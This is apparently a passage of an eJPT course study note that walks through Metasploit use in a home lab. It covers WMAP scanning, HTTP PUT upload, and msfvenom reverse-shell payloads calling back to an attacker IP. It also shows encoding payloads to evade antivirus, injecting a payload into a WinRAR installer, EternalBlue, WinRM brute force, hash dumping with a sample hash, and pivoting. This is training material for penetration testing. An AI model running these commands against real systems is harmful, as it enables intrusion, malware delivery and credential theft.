load wmap![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-c0b6ef2389f185e284ff6f7adfeafebf8c20102a%2Fimage-20230415164951596.png?alt=media)load wmap

* Add WMAP site

wmap\_sites -a 192.28.60.3

* Specify the target URL

wmap\_targets -t http://192.28.60.3wmap\_sites -lwmap\_targets -l

* Show only the MSF modules that will be able to be run against target

wmap\_run -t

* Run the **web app vulnerability scan**
  * this will run all enabled modules against the target web server

wmap\_run -e

* _Analyze the results produced by WMAP._

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-95e786ae8af9e36702f2dca72d5c949173c12d85%2Fimage-20230415165930386.png?alt=media)wmap\_run -t![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-e1c6ae0eaf0eeb364e08f62acd3996d79d8076dd%2Fimage-20230415170207090.png?alt=media)wmap\_run -e

* List WMAP found vulnerabilities

wmap\_vulns -l

* Since the allowed methods are `POST`, `OPTIONS`, `GET`, `HEAD`, exploit the vulnerability with the use of `auxiliary/scanner/http/http_put` module to upload a file into the `/data` directory
  * 📌 A reverse shell payload can be uploaded and run on the target.

use auxiliary/scanner/http/http\_putoptionsset PATH /data/set FILEDATA "File uploaded"set FILENAME file.txtrun![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-23e3f18254581336f1ee00860ef87f174f176772%2Fimage-20230415171358249.png?alt=media)Metasploit - auxiliary/scanner/http/http\_put

* Test if the file has been uploaded correctly

curl http://192.28.60.3:80/data/file.txt

### ​[Client-Side Attacks](https://www.offsec.com/metasploit-unleashed/client-side-attacks/) with MSF <a href="#client-side-attacks-with-msf" id="client-side-attacks-with-msf"></a>

A **client-side attack** is a security breach that happens on the client side.

* Social engineering techniques take advantage of human vulnerabilities
* Require user-interaction to open malicious documents or portable executables (**`PEs`**)
* The payload is stored on the client's system
* Attackers have to pay attention to Anti Virus detection

> ❗ _**Advanced modern antivirus solutions detects and blocks this type of payloads very easily.**_

#### ​[Msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) Payloads <a href="#msfvenom-payloads" id="msfvenom-payloads"></a>

> ​[**`msfvenom`**](https://www.kali.org/tools/metasploit-framework/#msfvenom) - a Metasploit standalone payload generator and encoder
>
> * **`e.g.`** - generate a malicious meterpreter payload, transfer it to a client target; once executed it will connect back to the payload handler and provides with remote access

* List available payloads

msfvenom --list payloads

* When generating a payload the exact name of the payload must be specified
  * target operating system
  * target O.S. architecture (x64, x86 ...)
  * payload type
  * protocol used to connect back (depends on requirements)

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-8374500896fdbc9698dcf904ca377f5d0d9a4158%2Fimage-20230415190726950.png?alt=media)**`e.g.`** of **Staged payload**

* `windows/x64/meterpreter/reverse_tcp`

**`e.g.`** of **Non-Staged payload**

* `windows/x64/meterpreter_reverse_https`

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-034cc3f4b42408fe6a3e0fb23ba7a745fa9482de%2Fimage-20230415191239575.png?alt=media)

* Generate a Windows payload with `msfvenom`

**32bit payload:**msfvenom -a x86 -p windows/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -f exe > /home/kali/certs/ejpt/Windows\_Payloads/payloadx86.exe​# LHOST = Attacker IP address**64bit payload:**msfvenom -a x64 -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -f exe > /home/kali/certs/ejpt/Windows\_Payloads/payloadx64.exe

* List the output formats available

msfvenom --list formatsFramework Executable Formats \[--format \<value>]===============================================Name----aspaspxaspx-exeaxis2dllducky-script-pshelfelf-soexeexe-onlyexe-serviceexe-smallhta-pshjarjsploop-vbsmachomsimsi-nouacosx-apppshpsh-cmdpsh-netpsh-reflectionpython-reflectionvbavba-exevba-pshvbswar​Framework Transform Formats \[--format \<value>]==============================================Name----base32base64bashccsharpdwdwordgogolanghexjavajs\_bejs\_lenimnimlangnumperlplpowershellps1pypythonrawrbrubyrustrustlangshvbapplicationvbscript

* Generate a Linux payload with `msfvenom`

**32bit payload:**msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -f elf > /home/kali/certs/ejpt/Linux\_Payloads/payloadx86**64bit payload:**msfvenom -p linux/x64/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -f elf > /home/kali/certs/ejpt/Linux\_Payloads/payloadx64

* 📌 _Platform and architecture are auto selected if not specified, based on the selected payload_

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-5623729fc9d37d7c64ce35442c390f254debe1be%2Fimage-20230415192514206.png?alt=media)The transferring method onto the target system depends on the type of the social engineering technique.

* **`e.g.`** A simple web server can be set up on the attacker system to serve the payload files and a handler to receive the connection back from the target system

cd /home/kali/certs/ejpt/Windows\_Payloadssudo python -m http.server 8080

* To deal with a `meterpreter` payload, an appropriate listener is necessary to handle the reverse connection, the `multi/handler` Metasploit module in this case

msfconsole -quse multi/handlerset payload windows/meterpreter/reverse\_tcpset LHOST 192.168.31.128set LPORT 1234run

* Download the payload on the Windows 2008 system (in this case my home lab VM) from this link
  * `http://192.168.31.128:8080`
  * Run the `payloadx86.exe` payload on the target
* The `meterpreter` session on the attacker machine should be opened

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ad022854e3f7b468ce17822415bef326f1f4c84e%2Fimage-20230415200856110.png?alt=media)Same example with the `linux/x86/meterpreter/reverse_tcp` Linux payload executed on the Kali VM.![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-a0dc06e0faab6ffdd48000e41ed434b71b6f763a%2Fimage-20230415201253314.png?alt=media)

#### Encoding Payloads <a href="#encoding-payloads" id="encoding-payloads"></a>

Signature based Antivirus solutions can detect malicious files or executables. Older AV solutions can be evaded by **encoding** the payloads.

* ❗ _This kind of attack vector is outdated and hardly used today_.
* May work on legacy old O.S. like Windows 7 or older.

🗒️ Payload **Encoding** involves changing the payload shellcode _with the aim of changing the payload signature_.

* ​[Encoding will not always avoid detection](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus)​

🗒️ **Shellcode** is the code typically used as a _payload_ for exploitation, that provides with a remote _command shell_ on the target system.msfvenom --list encoders![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-36c58ce623edb6604b5389a560b43c2b2889540f%2Fimage-20230415212307184.png?alt=media)msfvenom --list encoders

* Excellent encoders are **`cmd/powershell_base64`** and **`x86/shikata_ga_nai`**

**Windows Payload**

* Generate a Win x86 payload and encode it with `shikata_ga_nai`:

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -e x86/shikata\_ga\_nai -f exe > /home/kali/certs/ejpt/Windows\_Payloads/encodedx86.exe![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-d56db5d41d93664e9db09e119cb88f61f33c9b3b%2Fimage-20230415213830109.png?alt=media)msfvenom shikata\_ga\_nai Win

* The payload can be encoded as often as desired by increasing the number of iterations.
* The more iterations, the better chances to bypass an Antivirus. Use **`-i`** option.

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -i 10 -e x86/shikata\_ga\_nai -f exe > /home/kali/certs/ejpt/Windows\_Payloads/encodedx86.exe![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-9c008a977f1b16aded3166fa2f353eba24310ff4%2Fimage-20230415213941131.png?alt=media)

**Linux Payload**

msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -i 10 -e x86/shikata\_ga\_nai -f elf > /home/kali/certs/ejpt/Linux\_Payloads/encodedx86![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-e2cc12efa4f115212a607b3c46a2996a9eedb3bc%2Fimage-20230415213215234.png?alt=media)msfvenom shikata\_ga\_nai Linux

* Test each of the above generated payloads, like before

cd /home/kali/certs/ejpt/Windows\_Payloadssudo python -m http.server 8080msfconsole -q​use multi/handlerset payload windows/meterpreter/reverse\_tcpset LHOST 192.168.31.128set LPORT 1234run![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-272cfba18c7588efaa8b7563881176e593a4fd82%2Fimage-20230415213745031.png?alt=media)

> 📌 Modern antivirus detects and blocks the encoded payload as soon as the download is started:​![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-0a77cc42fa547ba68f55942bb166da905d8fe024%2Fimage-20230415214414552.png?alt=media)​

#### Injecting Payloads into PEs <a href="#injecting-payloads-into-pes" id="injecting-payloads-into-pes"></a>

🗒️ [Windows **Portable Executable**](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit) (**PE**) _is a file format for executables, object code, DLLs and others, used in 32-bit and 64-bit Windows O.S._

* Download a portable executable, **`e.g.`** [WinRAR](https://www.win-rar.com/download.html)​
* Payloads can be injected into PEs with `msfvenom` with the **`-x`** and **`-k`** options

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.31.128 LPORT=1234 -e x86/shikata\_ga\_nai -i 10 -f exe -x winrar-x32-621.exe > /home/kali/certs/ejpt/Windows\_Payloads/winrar.exe![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-27de7cdb23d59739b4d177f1a32ddc74780573ed%2Fimage-20230415220833685.png?alt=media)cd /home/kali/certs/ejpt/Windows\_Payloadssudo python -m http.server 8080msfconsole -q​use multi/handlerset payload windows/meterpreter/reverse\_tcpset LHOST 192.168.31.128set LPORT 1234run

* Transfer and run the `winrar.exe` file to the target O.S.
* File description is kept, but not its functionality.

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-c416cf444412c992defadf09a24f6adeb9401aac%2Fimage-20230415221016113.png?alt=media)![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-bbcec3f24282eddff37d2e07144fcfd9de12ccdc%2Fimage-20230415221130544.png?alt=media)

* Proceed with the Post Exploitation module to migrate the process into another one, in the `meterpreter` session

run post/windows/manage/migrate![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ca9eef2a7b72ca09defdcf07d701d4dc667061cc%2Fimage-20230415221432202.png?alt=media)

#### Automation with [Resource Scripts](https://www.offsec.com/metasploit-unleashed/writing-meterpreter-scripts/)​ <a href="#automation-with-resource-scripts" id="automation-with-resource-scripts"></a>

Repetitive tasks and commands can be automated using **MSF resource scripts** (same as batch scripts).

* Almost every MSF command can be automated.

ls -al /usr/share/metasploit-framework/scripts/resource![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-95ab3be68e60afb06d3824d9869156fdfb649c9f%2Fimage-20230415222643575.png?alt=media)/usr/share/metasploit-framework/scripts/resource**`e.g. 1`**

* _Automate the process of setting up a handler for the generated payloads_, by creating a new `handler.rc` file

nano handler.rc​# Insert the following lines# by specifying the commands sequentially​use multi/handlerset payload windows/meterpreter/reverse\_tcpset LHOST 192.168.31.128set LPORT 1234run​# Save it and exit

* Load and run the recourse script in `msfconsole`

msfconsole -q -r handler.rc![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-dbf1e139c5e8f0aa6fbddec7ff86e88719e8dd05%2Fimage-20230415223258567.png?alt=media)msfconsole -q -r handler.rc**`e.g. 2`**nano portscan.rc​# Insert the following lines# by specifying the commands sequentially​use auxiliary/scanner/portscan/tcpset RHOSTS 192.168.31.131run​# Save it and exitmsfconsole -q -r portscan.rc![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-9652fb3f7d34700f46ff906b184ad1c2111707ce%2Fimage-20230415223936432.png?alt=media)msfconsole -q -r portscan.rc**`e.g. 3`**nano db\_status.rc​db\_statusworkspaceworkspace -a TESTmsfconsole -q -r db\_status.rc![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-30a5d2563c243b3bef81b0835eaaf7aed1fdc488%2Fimage-20230415224235665.png?alt=media)

* 📌 Load up a resource script from within the `msfconsole` with the **`resource`** command

resource /home/kali/certs/ejpt/resource\_scripts/handler.rc

* Typed in commands in a new `msfconsole` session, can be exported in a new resource script

makerc /home/kali/certs/ejpt/resource\_scripts/portscan2.rc![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-6c31f9fe42cbe2502e56f60c7a96efd34cd3dee5%2Fimage-20230415224836969.png?alt=media)

### ​[Exploitation](https://www.offsec.com/metasploit-unleashed/exploits/) with MSF <a href="#exploitation-with-msf" id="exploitation-with-msf"></a>

#### HFS (HTTP File Server) <a href="#hfs-http-file-server" id="hfs-http-file-server"></a>

A **HFS** (HTTP File Server) is a file and documents sharing web server.

* Rejetto HFS - free open source HTTP file server

> 🔬 [HFS - MSF Exploit](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/hfs-msf-exp)​

#### SMB - MS17-010 EternalBlue <a href="#smb-ms17-010-eternalblue" id="smb-ms17-010-eternalblue"></a>

* ​[CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)​
* ​[EternalBlue VA](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/4-va#eternalblue)​
  * **EternalBlue** takes advantage of a Windows SMBv1 protocol vulnerability
  * Patch was released in March 2017

> 🔬 Check the [Lab 2 - Eternal Blue here](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/1-system-attack/windows-attacks/smb-psexec)​

* Some MSF useful commands from my Home Lab (`Kali VM + Win 2008_R2 Server`)

service postgresql start && msfconsole -qdb\_statussetg RHOSTS 192.168.31.131setg RHOST 192.168.31.131workspace -a EternalBlue​db\_nmap -sS -sV -O 192.168.31.131search type:auxiliary EternalBlueuse auxiliary/scanner/smb/smb\_ms17\_010optionsrun​search type:exploit EternalBlueuse exploit/windows/smb/ms17\_010\_eternalblueoptionsrun

#### WinRM <a href="#winrm" id="winrm"></a>

* Identify WinRM users with MSF and exploit WinRM by obtaining access credentials.
* Default WinRM HTTP port is **`5985`** and HTTPS **`5986`**

> 🔬 [WinRM Attack lab](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/1-system-attack/windows-attacks/winrm)​

service postgresql start && msfconsole -qdb\_statussetg RHOSTS 10.2.27.173setg RHOST 10.2.27.173workspace -a WinRM​db\_nmap -sS -sV -O -p- 10.2.27.173# Port 5985 is set up for WinRMsearch type:auxiliary winrmuse auxiliary/scanner/winrm/winrm\_auth\_methodsoptionsrun​# Brute force WinRM loginsearch winrm\_loginuse auxiliary/scanner/winrm/winrm\_loginset USER\_FILE /usr/share/metasploit-framework/data/wordlists/common\_users.txtset PASS\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txt​search winrm\_cmduse auxiliary/scanner/winrm/winrm\_cmdset USERNAME administratorset PASSWORD tinkerbellset CMD whoamirun![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-0bc3dc4945d45488dc092b94ee70750d1eb5b2e2%2Fimage-20230416114857268.png?alt=media)search winrm\_scriptuse exploit/windows/winrm/winrm\_script\_execset USERNAME administratorset PASSWORD tinkerbellset FORCE\_VBS trueexploit

#### Apache Tomcat <a href="#apache-tomcat" id="apache-tomcat"></a>

​[**`Apache Tomcat`**](https://tomcat.apache.org/) is a free open source Java servlet web server, _build to host dynamic websites and web apps developed in **Java**_.

* Tomcat default TCP port is **`8080`**
* Apache web server host HTML/PHP web apps, instead
* Apache Tomcat < **`v.8.5.23`** is vulnerable to a JSP Upload Bypass / RCE

> 🔬 [Tomcat - MSF Exploit](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/tomcat-msf-exp)​

#### FTP <a href="#ftp-1" id="ftp-1"></a>

​[**`vsftpd`**](https://security.appspot.com/vsftpd.html) is an Unix FTP server.

* vsftpd **`v.2.3.4`** is vulnerable to a command execution vulnerability

> 🔬 [FTP - MSF Exploit](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/ftpd-msf-exp)​

#### SAMBA <a href="#samba" id="samba"></a>

**`Samba`** is the Linux implementation of SMB.

* Samaba **`v.3.5.0`** is vulnerable to a RCE vulnerability

> 🔬 [Samba - MSF Exploit](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/samba-msf-exp)​

#### SSH <a href="#ssh-1" id="ssh-1"></a>

**`libssh`** is a C library that implements the SSHv2 protocol

* **`SSH`** default TCP port is **`22`**
* libssh **`v.0.6.0 - 0.8.0`** is vulnerable to an authentication bypass vulnerability

> 🔬 [SSH - MSF Exploit](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/ssh-msf-exp)​

#### SMTP <a href="#smtp-1" id="smtp-1"></a>

​[**`Haraka`**](https://haraka.github.io/) is an open source high performance SMTP server developed in `Node.js`

* **`SMTP`** default TCP port is **`25`**
  * other TCP ports are **`465`** and **`587`**
* Haraka prior to **`v.2.8.9`** is vulnerable to command injection

> 🔬 [SMTP - MSF Exploit](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/smtp-msf-exp)​

### ​[Post Exploitation](https://www.offsec.com/metasploit-unleashed/msf-post-exploitation/) with MSF <a href="#post-exploitation-with-msf" id="post-exploitation-with-msf"></a>

🗒️ **Post Exploitation** is the process of gaining further information or access to the target's internal network, after the initial exploitation phase, using various techniques like:

* **local enumeration**
* ​[**privilege escalation**](https://www.offsec.com/metasploit-unleashed/privilege-escalation/)​
* **maintaining persistent access**
* ​[**pivoting**](https://www.offsec.com/metasploit-unleashed/pivoting/)​
* **dumping hashes**
* **covering tracks**

There are many post exploitation modules provided by the MSF.🗒️ **Persistence** consists of techniques used by adversaries _to maintain access to systems across restarts, changed credentials, or other interruptions_.🗒️ [**Keylogging**](https://www.offsec.com/metasploit-unleashed/keylogging/) is the action of (secretly) _recording/capturing the keystrokes entered on a target system_.🗒️ **Pivoting** is a post exploitation technique of using a compromised host, a **`foothold`** / **`plant`**, to attack other systems on its private internal network.

#### Fundamentals - [Meterpreter](https://www.offsec.com/metasploit-unleashed/about-meterpreter/)​ <a href="#fundamentals-meterpreter" id="fundamentals-meterpreter"></a>

* Facilitates the execution of system commands, file system navigation, keylogging
* Load custom scripts and plugins dynamically
* 📌 **MSF has various types of `Meterpreter` payloads based on the target environment**

> 🔬 Check the [Meterpreter Labs](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/meterpreter-msf) for various `Meterpreter` commands and techniques examples and how to upgrade shells to Meterpreter sessions.

#### Windows PE Modules <a href="#windows-pe-modules" id="windows-pe-modules"></a>

Windows post exploitation MSF modules can be used to:

* Enumerate user privileges, logged-on users, installed programs, antiviruses, computers connected to a domain, installed patches and shares
* VM check

🗒️ **Windows Event Logs**, accessed via the `Event Viewer` on Windows, are categorized into:

* `Application logs` - apps startups, crashes, etc
* `System logs` - system startups, reboots, etc
* `Security logs` - password changes, authentication failures/success, etc

Clearing event logs is an important part of the system assessment.

> 🔬 Check out the [Windows Post Exploitation with MSF Labs](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/win-post-msf) with **post-exploitation** techniques for various _Windows services_.

#### Linux PE Modules <a href="#linux-pe-modules" id="linux-pe-modules"></a>

Linux post exploitation MSF modules can be used to:

* Enumerate system configuration, environment variables, network configuration, user's history
* VM check

> 🔬 Check out the [Linux Post Exploitation with MSF Labs](https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/3-metasploit/linux-post-msf) with **post-exploitation** techniques for various _Unix services_.

### ​[Armitage](https://www.offsec.com/metasploit-unleashed/armitage/) - MSF GUI <a href="#armitage-msf-gui" id="armitage-msf-gui"></a>

🗒️ **Armitage** is a Java-based GUI front-end for the MSF.

* Automate port scanning, exploitation, post exploitation
* Visualize targets
* Requires MSFdb and services to be running
* Pre-packed with Kali Linux

> 🔬 **Port Scanning & Enumeration With Armitage** - lab by INE
>
> * Victim Machine 1: `10.2.21.86`
> * Victim Machine 2: `10.2.25.150`

service postgresql start && msfconsole -qdb\_status\[\*] Connected to msf. Connection type: postgresql.​# Open a new tab and start Armitagearmitage# Answer "YES" for the RPC server![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-f904d06c20ea9b281adbd29080a55da613d7b57e%2Fimage-20230422172326118.png?alt=media)Armitage

* **Hosts - Add Hosts**
  * Add victim 1 IP
  * Set the lab as `Victim 1`
* Right-click the target and **Scan** it

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-a53c7667e990970553e6edec9bc36283decae547%2Fimage-20230422172731476.png?alt=media)

* Check **Services**
* Perform an **Nmap Scan** from the **Hosts** menu

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-959d828ae25353531072e17d3e69bf54c444d770%2Fimage-20230422173026361.png?alt=media)

* Check **Services**

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-91b06c94b8705da0674d6fc589193c3844f6f7df%2Fimage-20230422173127590.png?alt=media)

#### Exploitation <a href="#exploitation" id="exploitation"></a>

* Search for `rejetto` and launch the exploit module

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-9df574e8bb53e8691054af5000a6f3de697520be%2Fimage-20230422173456328.png?alt=media)![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-34b3185a08d1884a6069ad109d1fd193cc0bc3cd%2Fimage-20230422173621170.png?alt=media)

* Try **Dump Hashes** via the `registry method`

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-152abcd90ca82912756d14c11cd27bfe89ff39bb%2Fimage-20230422174938564.png?alt=media)Metasploit - post/windows/gather/smart\_hashdump

* Saved hashes can be found under the **View - Loot** menu

Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::

* **Browse Files**

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-fd40b2a2cd54e84bf911ffb5c84c904aed746348%2Fimage-20230422175355019.png?alt=media)

* **Show Processes**

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-b333383b01ea5e7a005a3b880114e1ccfb64634a%2Fimage-20230422175459608.png?alt=media)

#### Pivoting <a href="#pivoting" id="pivoting"></a>

* Setup **Pivoting**

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-40b0bf170483ebc9b690f70c7602415bcfbc135d%2Fimage-20230422175630076.png?alt=media)

* Add, Enumerate and Exploit `Victim 2`

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-432af299eca1238d2e8a3a221b9de47b0138b6ba%2Fimage-20230422180124226.png?alt=media)

* Port forward the port `80` and use `nmap`

\# In the Meterpreter tabportfwd add -l 1234 -p 80 -r 10.2.25.150# In the msf Console tabdb\_nmap -sV -p 1234 localhost![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-dd4d5d7e4d215d6dccaa98a9420a9dcb74d84251%2Fimage-20230422180508381.png?alt=media)

* Remove the created localhost `127.0.0.1`
* Search for `BadBlue` and use the `badblue_passthru` exploit on `Victim 2`

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-40bbac8f8d285bb67df85ab45158658bf7a3a824%2Fimage-20230422181450963.png?alt=media)

* Migrate to an `x64` from the **Processes** tab
* Dump hashes with the `lsass method`

#### Armitage Kali Linux Install <a href="#armitage-kali-linux-install" id="armitage-kali-linux-install"></a>

sudo apt install armitage -ysudo msfdb initsudo nano /etc/postgresql/15/main/pg\_hba.conf# On line 87 switch “scram-sha-256” to “trust”sudo systemctl enable postgresqlsudo systemctl restart postgresqlsudo armitage



